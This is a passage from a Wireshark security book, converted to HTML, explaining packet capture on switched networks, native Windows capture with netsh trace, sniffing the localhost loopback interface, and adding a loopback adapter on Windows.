play a lot more with TShark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark259" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Dealing with the Network" ></a>Dealing with the Network</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Earlier you experimented with a short capture (or is it still running?). Whether you use the Wireshark GUI or the TShark command-line interface, the packets visible to your device might be limited by the topology of your network. This is the common, fundamental challenge to anyone seeking to capture packets. And that&#8217;s what this section is all about.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >What good is a packet analyzer if you can&#8217;t get the packets you want to</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section133" ><p class=MsoBodyText  style="margin-top:3.9500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >analyze? The answer is pretty simple: It isn&#8217;t! In this section, we go over different ways to capture packets to make sure you don&#8217;t ever have the problem of not being able to get the network data you need for your task.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:8.2000pt;" ><a name="_bookmark260" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Capturing packets on Ethernet networks wasn&#8217;t much of a problem until the rise of switched networks. Before the switch, the main tool</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >for connecting multiple networked devices was a hub. A hub just copied every packet it received to all ports except the one it was received on to prevent loops. This meant everyone with enough privileges on a connected computer could capture all the traffic passing through the hub. Today it is more complicated; capturing packets requires anything from configuration changes to specialized equipment or dedicated packet-capturing features on network</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.5000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >devices.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:9.4500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This section describes methods for capturing packets and, where applicable, provides explicit instructions on how to perform the capture. One warning, however: We are going to be talking about tools other than what is available with Wireshark. While this may seem blasphemous, we need to be clear on the Wireshark use case. The majority of Wireshark functionality is geared toward analyzing packets. Also, there are situations where you do not want to install any additional software but still need to gather packet data. We address these situations by discussing some other tools and scripts that are capable of recording a network into pcap format for later, offline analysis by Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:13.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Local Machine</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:13.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >At times, it seems just capturing packets from your host machine isn&#8217;t of much use, although you would be surprised at the information you can salvage from a network analyzer by just plugging it in and having it listen. Additionally, seeing what your network applications are actually doing on the network often tells you more than a thousand error messages can. In this section, we go over some techniques for capturing traffic on the local machine. In particular, we cover how to capture packets from the local machine using tools that are native to Windows and Linux as well as how to capture traffic that is just going</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section134" ><p class=MsoBodyText  style="margin-top:3.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >over </span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >localhost.</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Nati</span></i></b><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >ve Packet Capture</span></i></b></a></span><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:10.7000pt;" ><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Nati</span></i><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >ve </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packet capture refers to capturing packets from a machine</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;with</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >out having to install any additional tools. As mentioned in the</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;intro</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >duction to this section, it is useful to be aware of the methods to</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;capt</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >ure traffic from a local machine without having to install</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;addi</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >tional software. A good example of a situation like this is when</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;softw</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >are is installed that prevents the installation or running of</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;softw</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >are that is not preapproved or included by default with the</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;oper</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >ating system installation. Another example is if you are trying to</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;anal</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >yze a potentially compromised machine and want to avoid tipping</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;your </span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >hand to the bad guy or muddling your results by installing</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;addi</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >tional software. Luckily, there are options for both Linux and</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;Win</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >dows that enable you to get packet data without having to install</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;any </span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >additional tools.</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:15.1500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Nati</span></i></b><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >ve Windows Capture</span></i></b></a></span><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We c</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >over native packet capture in Windows first. Capturing traffic on</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;Win</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >dows 10 and below without installing additional software is all but</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;imp</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >ossible. We don&#8217;t say it is completely impossible, because if</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;work</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >ing in this industry has taught us anything, it is that anything is</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;poss</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >ible. The reason this is fortuitous is that newer versions of</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;Win</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >dows actually provide functionality that can be leveraged to get</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;pack</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >et captures without having to install any additional tools.</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We </span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >are going to look at the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >netsh </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command-line tool. This tool has</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;been </span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >available on Windows for several versions, and Windows 10 has</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;only </span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >grown its feature set. In particular, it has the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >netsh trace</span></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >com</span><span><a href="https://technet.microsoft.com/en-us/library/cc754516(v%3Dws.10).aspx" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >mand, which we will leverage to get some packet data.</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="204"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker175314.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section135" ><p class=MsoBodyText  style="margin-left:13.2500pt;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:763.0000px;height:54.0000px;" ><img width="763"  height="54"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker175342.png" ></span></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:5.2500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There are a lot of awesome resources on the Internet for how you can really use </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >netsh trace</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, so we are not going to go into too much detail of all the options this tool supports. For starters, at a command prompt, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >netsh trace /? </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to view the options.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:14.7500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Sniffing Localhost</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When we say localhost, we are usually talking about the loopback adapter, which is basically a virtual interface that isn&#8217;t physically connected to an actual network. Localhost is actually just a hostname. By convention, however, localhost almost always resolves to the reserved </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >127.0.0.1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >IPv4 address and the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >::1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >IPv6 address. Generally, applications use this loopback interface for inter-process communication between applications running on the same host machine.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Localhost is also often used by services that do not need to be exposed to a larger network. A prime example is a database server running on the same machine as the web application connecting to that database. Because the database is potentially accessible from outside of the web application machine, it poses a security risk. In such situations, simply bind the database to localhost so that the local web server can still communicate with it but the database is inaccessible from processes outside the local machine.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >It should be noted that occasionally you will see applications that mess this up. For example, if your machine has an IP address of </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >192.168.56.101 </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and <a name="_bookmark262" ></a>you bind a service to that IP specifically, then processes running on your local machine will be able to communicate with that service, much like they can if the service was bound to</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >127.0.0.1</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The difference, however, is that anyone who can access the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >192.168.56.101 </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >from the local network at large can also interact with the service. This is why it is important to make sure that services that do not need to be exposed to the network at large are not binding to</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0.0.0.0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(which is shorthand for all IP addresses) or any other interface that has a reachable IP address.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section136" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >On Linux-based operating systems the loopback interface is generally the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >lo </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >interface. Wireshark can easily attach to this interface and sniff packets destined to localhost only.<a name="_bookmark263" ></a>&nbsp;</span><span><a href="#_bookmark264" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-5</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows some sample ICMP traffic to the IP address </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >127.0.0.1</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="781"  height="348"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker177612.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark264" ></a><span><a href="#_bookmark263" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-5:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Sample localhost ICMP traffic</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Windows and Localhost</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In networking, every system has a hostname. The hostname identifies that specific system for services or connections. And while the hostname is unique compared to other systems, every system has the same name &#8220;local&#8221; to itself: localhost.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The hostname localhost refers to the system you&#8217;re currently on. Connecting to localhost connects you to services running on the local system. If you have a web server running locally to serve the web files in a browser, simply type </span><span><a href="http://localhost/" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >http://localhost</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to browse the locally running web service.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Similar to the local system&#8217;s hostname, the network adapter used to connect to localhost is also special. It is called the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >loopback adapter</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The loopback adapter is not a physical network adapter, but only a logical one. Wireshark is able to sniff <a name="_bookmark265" ></a>and capture network traffic from the loopback adapter, provided it is installed. However, for Windows, the loopback adapter is not installed by default.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section137" ><h4 style="margin-top:3.4000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Adding a Loopback Adapter to Windows</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The loopback adapter is not present by default on Windows systems. This does not mean that it is not using the loopback principle to transmit traffic to the local machine. To be able to capture this traffic, you need to add the loopback interface manually. Once the loopback adapter is available for Wireshark to present as an option, you can select it and capture from it.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Follow these steps to add the loopback interface to your Windows sniffing host:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:50.3000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l15 level1 lfo7;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Run </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >hdwwiz</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.2000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >in a command prompt. This should open the Add Hardware</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wizard.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.8000pt;margin-right:82.9000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l15 level1 lfo7;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Click Next and select the manual device selection</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.7000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >option (Advanced).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.6000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l15 level1 lfo7;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' 